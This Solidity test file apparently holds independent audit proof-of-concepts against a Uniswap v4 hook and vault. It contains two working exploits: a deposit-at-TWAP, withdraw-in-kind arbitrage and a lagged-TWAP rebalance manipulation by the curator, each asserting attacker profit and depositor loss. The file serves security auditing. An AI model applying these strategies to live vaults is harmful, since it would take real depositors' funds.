// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "v4-core/test/utils/Deployers.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {HurdleHook} from "../../src/HurdleHook.sol";
import {HurdleVault} from "../../src/HurdleVault.sol";
import {HookMiner} from "../utils/HookMiner.sol";

/// Independent audit PoCs. Each test PASSES when the bug is present.
contract AuditPoC is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    int24 constant SPACING = 60;
    address constant CURATOR = address(0xC0);
    address constant ALICE = address(0xA1);
    address constant ARB = address(0xA7);

    HurdleHook hook;
    HurdleVault vault;
    MockERC20 t0;
    MockERC20 t1;

    function setUp() public {
        vm.warp(1_000_000);
        deployFreshManagerAndRouters();
        deployMintAndApprove2Currencies();
        uint160 flags = uint160(
            Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_REMOVE_LIQUIDITY_FLAG | Hooks.BEFORE_SWAP_FLAG
                | Hooks.AFTER_INITIALIZE_FLAG | Hooks.BEFORE_DONATE_FLAG
        );
        (, bytes32 salt) = HookMiner.find(address(this), flags, type(HurdleHook).creationCode, abi.encode(manager));
        hook = new HurdleHook{salt: salt}(manager);
        LIQUIDITY_PARAMS = IPoolManager.ModifyLiquidityParams(
            TickMath.minUsableTick(SPACING), TickMath.maxUsableTick(SPACING), 2000e18, 0
        );
        (key,) = initPoolAndAddLiquidity(currency0, currency1, IHooks(address(hook)), 3000, SQRT_PRICE_1_1);
        t0 = MockERC20(Currency.unwrap(currency0));
        t1 = MockERC20(Currency.unwrap(currency1));
        // Build >30 min of oracle history at tick 0.
        for (uint256 i; i < 40; ++i) {
            vm.warp(block.timestamp + 60);
            _swapTo(i % 2 == 0 ? int24(1) : int24(0));
        }
        vm.warp(block.timestamp + 60);
    }

    function _fund(address who, address spender, uint256 a0, uint256 a1) internal {
        t0.transfer(who, a0);
        t1.transfer(who, a1);
        vm.startPrank(who);
        t0.approve(spender, type(uint256).max);
        t1.approve(spender, type(uint256).max);
        vm.stopPrank();
    }

    function _swapTo(int24 tick) internal {
        uint160 target = TickMath.getSqrtPriceAtTick(tick);
        (uint160 now_,,,) = manager.getSlot0(key.toId());
        if (target == now_) return;
        swapRouter.swap(
            key,
            IPoolManager.SwapParams(target < now_, -int256(1e30), target),
            PoolSwapTest.TestSettings(false, false),
            ZERO_BYTES
        );
    }

    function _spotTick() internal view returns (int24 t) {
        (, t,,) = manager.getSlot0(key.toId());
    }

    function _valueAtSpot(uint256 a0, uint256 a1) internal view returns (uint256) {
        (uint160 sp,,,) = manager.getSlot0(key.toId());
        return a0 * uint256(sp) / (1 << 96) * uint256(sp) / (1 << 96) + a1;
    }

    /// Vault holdings (idle + position) valued at the current spot price.
    function _vaultSpotValue(HurdleVault v) internal view returns (uint256) {
        (int24 lo, int24 hi, uint128 liq) = v.position();
        uint256 a0 = t0.balanceOf(address(v));
        uint256 a1 = t1.balanceOf(address(v)) - v.bond();
        if (liq > 0) {
            (uint160 sp,,,) = manager.getSlot0(key.toId());
            (uint256 p0, uint256 p1) = _amounts(sp, lo, hi, liq);
            a0 += p0;
            a1 += p1;
        }
        return _valueAtSpot(a0, a1);
    }

    function _amounts(uint160 sp, int24 lo, int24 hi, uint128 liq) internal pure returns (uint256 a0, uint256 a1) {
        uint160 sa = TickMath.getSqrtPriceAtTick(lo);
        uint160 sb = TickMath.getSqrtPriceAtTick(hi);
        if (sp <= sa) a0 = uint256(liq) * (1 << 96) / sa - uint256(liq) * (1 << 96) / sb;
        else if (sp >= sb) a1 = uint256(liq) * (sb - sa) / (1 << 96);
        else {
            a0 = uint256(liq) * (1 << 96) / sp - uint256(liq) * (1 << 96) / sb;
            a1 = uint256(liq) * (sp - sa) / (1 << 96);
        }
    }

    // -----------------------------------------------------------------------
    // F1: deposit is priced at TWAP, withdraw is pro-rata in kind => the vault
    // is a free market maker at the stale TWAP price. No manipulation needed:
    // after any real price move, while |spot - TWAP| <= maxTickDeviation,
    // anyone can deposit the token that is cheap at spot and withdraw a basket.
    // -----------------------------------------------------------------------
    function test_F1_depositAtTwapWithdrawInKindArb() public {
        vault = new HurdleVault(manager, key, CURATOR, 2000, 200, 50, 600);
        _fund(CURATOR, address(vault), 0, 2e18);
        vm.prank(CURATOR);
        vault.postBond(2e18);
        _fund(ALICE, address(vault), 30e18, 30e18);
        vm.prank(ALICE);
        vault.deposit(30e18, 30e18);
        vm.prank(CURATOR);
        vault.rebalance(TickMath.minUsableTick(SPACING), TickMath.maxUsableTick(SPACING));

        // Honest market move: token0 drops 45 ticks. 12 s later TWAP has barely moved.
        _swapTo(-45);
        vm.warp(block.timestamp + 12);
        int24 twap = hook.twapTick(key.toId());
        assertGe(twap, -1, "TWAP still ~0");
        assertEq(_spotTick(), -45);

        uint256 vaultBefore = _vaultSpotValue(vault);
        _fund(ARB, address(vault), 40e18, 0);
        uint256 arbBefore = _valueAtSpot(t0.balanceOf(ARB), t1.balanceOf(ARB));
        vm.startPrank(ARB);
        for (uint256 i; i < 15; ++i) {
            uint256 s = vault.deposit(t0.balanceOf(ARB) > 30e18 ? 30e18 : t0.balanceOf(ARB), 0);
            vault.withdraw(s);
        }
        vm.stopPrank();
        uint256 arbAfter = _valueAtSpot(t0.balanceOf(ARB), t1.balanceOf(ARB));
        uint256 vaultAfter = _vaultSpotValue(vault);
        console2.log("arb profit (token1 wei, at spot):", arbAfter - arbBefore);
        console2.log("vault loss (token1 wei, at spot):", vaultBefore - vaultAfter);
        console2.log("vault NAV at spot before:", vaultBefore);
        assertGt(arbAfter, arbBefore, "arb profits");
        assertGt(vaultBefore - vaultAfter, 0.05e18, "depositors lose to arb");
    }

    // -----------------------------------------------------------------------
    // F2: the rebalance swap is price-limited to TWAP +/- maxTickDeviation, not to
    // the real price. While TWAP lags a move, a curator (or anyone, at the firing
    // settle / post-fire rebalance) pushes spot back into the band, makes the vault
    // sell into it, and buys back. One epoch's loss exceeds the bond floor that
    // MAX_REBALANCES_PER_EPOCH * maxTickDeviation <= minBondBps was meant to bound.
    // -----------------------------------------------------------------------
    function test_F2_laggedTwapRebalanceLossExceedsBondFloor() public {
        vault = new HurdleVault(manager, key, CURATOR, 2000, 200, 50, 600);
        _fund(CURATOR, address(vault), 0, 0.5e18);
        vm.prank(CURATOR);
        vault.postBond(0.5e18); // 2.5% of 20e18 NAV, above the 2% floor
        _fund(ALICE, address(vault), 10e18, 10e18);
        vm.prank(ALICE);
        vault.deposit(10e18, 10e18);
        vm.prank(CURATOR);
        vault.rebalance(TickMath.minUsableTick(SPACING), TickMath.maxUsableTick(SPACING));

        // Market: token0 rallies 800 ticks (~8.3%). 12 s later TWAP is ~5 ticks.
        _swapTo(800);
        vm.warp(block.timestamp + 12);
        int24 fair = _spotTick();
        uint256 honest = _vaultSpotValue(vault);

        // Attacker = curator + its own swaps (this contract). Value P&L at the fair price.
        uint256 me0 = t0.balanceOf(address(this));
        uint256 me1 = t1.balanceOf(address(this));
        for (uint256 i; i < 3; ++i) { // 1 of 4 slots used by the initial park
            int24 twap = hook.twapTick(key.toId());
            _swapTo(twap + 45); // into the band
            int24 c = (twap / SPACING) * SPACING;
            vm.prank(CURATOR); // range far below spot => vault must sell all token0
            vault.rebalance(c - 6000, c - 3000);
        }
        _swapTo(fair); // buy the cheap token0 back
        uint256 after_ = _vaultSpotValue(vault);
        uint256 loss = honest - after_;
        int256 d0 = int256(t0.balanceOf(address(this))) - int256(me0);
        int256 d1 = int256(t1.balanceOf(address(this))) - int256(me1);
        (uint160 sp,,,) = manager.getSlot0(key.toId());
        int256 pnl = d1 + d0 * int256(uint256(sp)) / int256(1 << 96) * int256(uint256(sp)) / int256(1 << 96);
        console2.log("vault value at fair, honest:", honest);
        console2.log("vault loss at fair         :", loss);
        console2.log("loss bps of NAV            :", loss * 10_000 / honest);
        console2.log("bond posted                :", vault.bond());
        console2.log("attacker P&L at fair (int) :");
        console2.logInt(pnl);
        assertGt(loss * 10_000, uint256(vault.minBondBps()) * honest, "one epoch loses more than the bond floor");
        assertGt(loss, vault.bond(), "loss exceeds the whole bond");
        assertGt(pnl, int256(vault.bond()), "curator-attacker nets more than the bond it forfeits");
    }
}
